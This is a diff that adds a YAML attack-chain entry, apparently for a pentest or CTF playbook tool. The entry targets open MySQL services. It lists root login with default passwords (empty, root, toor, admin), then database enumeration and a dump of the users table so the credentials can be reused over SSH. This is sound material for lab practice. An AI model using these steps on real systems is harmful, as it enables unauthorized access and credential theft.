@@ -1,0 +1,39 @@
+chain_id: mysql_open
+title: "MySQL — login with default credentials and dump tables"
+severity: MEDIUM
+tags: [mysql, database, default-creds, sql]
+
+trigger:
+  any_of:
+    - { port: 3306 }
+    - { service_pattern: "(?i)mysql" }
+
+description: |
+  Open MySQL service detected. Most boxes are misconfigured to accept
+  empty/default credentials. After login, enumerate databases and dump
+  the user table — credentials there often reuse on SSH.
+
+steps:
+  - id: 1
+    title: "Connect to MySQL"
+    command: mysql -h $VICTIMA -u root -p
+    notes: |
+      Try common passwords: empty, root, toor, admin.
+
+  - id: 2
+    title: "Internal MySQL session commands"
+    command: |
+      SHOW DATABASES;
+      USE nombre_db;
+      SHOW TABLES;
+      SELECT * FROM users;
+      EXIT;
+
+common_errors:
+  - error: "ERROR 1130: Host is not allowed to connect"
+    solution: |
+      MySQL only accepts local connections. You must obtain shell access on
+      the box first and connect from inside.
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
